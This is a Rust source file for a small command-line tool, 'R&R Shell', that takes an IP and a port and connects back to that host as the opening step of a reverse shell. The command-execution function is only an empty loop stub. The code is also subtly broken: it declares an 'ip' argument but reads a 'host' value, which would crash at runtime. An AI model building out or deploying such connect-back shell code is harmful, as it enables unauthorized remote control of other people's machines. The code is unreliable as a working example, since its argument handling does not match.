extern crate clap;
use clap::{App, Arg};

use std::process::Command;
use std::{env, net::TcpStream};

fn main() {
    let matches = App::new("R&R Shell")
        .version("1.0")
        .arg(
            Arg::with_name("ip")
                .short("i")
                .help("IP address of host to connect back to.")
                .required(true)
                .takes_value(true),
        )
        .arg(
            Arg::with_name("port")
                .short("p")
                .help("Port on host to connect to.")
                .required(true)
                .takes_value(true),
        )
        .get_matches();

    let port = matches.value_of("port").unwrap();
    let host = matches.value_of("host").unwrap();
    let client_type = env::consts::FAMILY;

    println!("[*] Creating connection to {host}:{port}");
    let mut stream = TcpStream::connect(format!("{}:{}", host, port));

    match stream {
        Ok(succ) => {
            println!("[*] Connection successful.");
            command_exec_listener(succ, client_type);
        }
        Err(e) => {
            println!("[*] Failed to create connection with error {e}");
            return;
        }
    }
}

fn command_exec_listener(stream: TcpStream, client_fam: &str) -> ! {
    loop {}
}
